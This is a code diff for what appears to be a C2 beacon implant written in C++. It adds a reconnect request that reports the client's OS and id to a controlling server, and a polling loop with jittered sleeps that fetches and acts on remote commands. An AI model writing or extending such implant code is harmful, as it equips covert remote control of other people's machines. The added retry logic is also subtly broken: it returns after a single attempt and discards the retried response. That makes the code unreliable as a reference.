@@ -6,6 +6,7 @@
 #include <curl/curl.h>
 #include <json/json.h>
 #include <cstdlib> 
+#include <ctime>
 
 #ifdef __unix__
 #define OS "Linux"
@@ -45,7 +46,7 @@ std::tuple<int, std::string, std::string> getRequest(const std::string& url) {
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
         res = curl_easy_perform(curl);
         if(res != CURLE_OK) {
-            throw std::runtime_error("curl_easy_perform() failed: " + std::string(curl_easy_strerror(res)));
+            return (std::make_tuple(-1, "", ""));
         }
         curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
         curl_easy_cleanup(curl);
@@ -92,6 +93,9 @@ std::tuple<int, std::string, int> httpConnection(const std::string& address) {
     std::cout << "Request URL: " << url << std::endl;
 
     auto [response_code, response_body, response_url] = getRequest(url);
+    if (response_code == -1) {
+        return std::make_tuple(-1, "", -1);
+    }
 
     try {
         if (response_code == 200) {
@@ -120,11 +124,59 @@ std::tuple<int, std::string, int> httpConnection(const std::string& address) {
     }
 }
 
-void beacon(const std::string& address, const std::string& ID, int jitter, int timer) {
+std::tuple<int, std::string, int> httpReconnect(const std::string& address, const std::string& user_id, int jitter, int timer) {
+    std::string hostname = "client";
+    std::vector<std::string> ipAddresses = getIPAddresses();
+
+    std::string url = "http://" + address + ":8080/reconnect?name=" + hostname + "&os=" + OS + "&address=127.0.0.1&id=" + user_id + "&timer=" + std::to_string(timer) + "&jitter=" + std::to_string(jitter);
+    std::cout << "Request URL: " << url << std::endl;
+
+    auto [response_code, response_body, response_url] = getRequest(url);
+    if (response_code == -1) {
+        return std::make_tuple(-1, "", -1);
+    }
+
+    try {
+        if (response_code == 200) {
+            return std::make_tuple(response_code, response_body, 0);
+        } else {
+            throw std::runtime_error("Failed to reconnect to server: " + std::to_string(response_code) + " " + response_body);
+        }
+    } catch (const std::exception& e) {
+        std::cerr << "Exception: " << e.what() << std::endl;
+        throw;
+    }
+}
+
+int beacon(const std::string& address, const std::string& ID, int jitter, int timer) {
+    srand(time(0));
     while (true) {
         std::string url = "http://" + address + "/beacon?id=" + ID;
         std::cout << "Request URL: " << url << std::endl;
+
+        int sign = (rand() % 2 == 0) ? 1 : -1;
+        int sleepTime = timer + sign * (rand() % (jitter + 1));
+        if (sleepTime < 0) {
+            sleepTime = timer;
+        }
+        
         auto [response_code, response_body, response_url] = getRequest(url);
+        if (response_code == -1) {
+            int count = 0;
+            while (count < 5) {
+                count++;
+                #ifdef _WIN32
+                    Sleep(sleepTime * 1000);
+                #else
+                    std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
+                #endif
+                auto [response_code, response_body, response_url] = getRequest(url);
+                if (response_code == 200) {
+                    break;
+                }   
+            return -1;
+            } 
+        }
         try {
             if (response_code == 200) {
                 Json::Value data;
@@ -141,7 +193,7 @@ void beacon(const std::string& address, const std::string& ID, int jitter, int t
                     std::string cid = data["command_uuid"].asString();
 
                     if (command == "session") {
-                        return;
+                        return 1;
                     }
                 }
 
@@ -154,7 +206,7 @@ void beacon(const std::string& address, const std::string& ID, int jitter, int t
                     }
                 }
 
-                int sleepTime = timer + rand() % (2 * jitter + 1) - jitter;
+                std::cout << "Sleeping for " << sleepTime << " seconds" << std::endl;
 
                 #ifdef _WIN32
                     Sleep(sleepTime * 1000);
@@ -166,4 +218,5 @@ void beacon(const std::string& address, const std::string& ID, int jitter, int t
             std::cerr << "Exception: " << e.what() << std::endl;
         }
     }
+    return 0;
 }
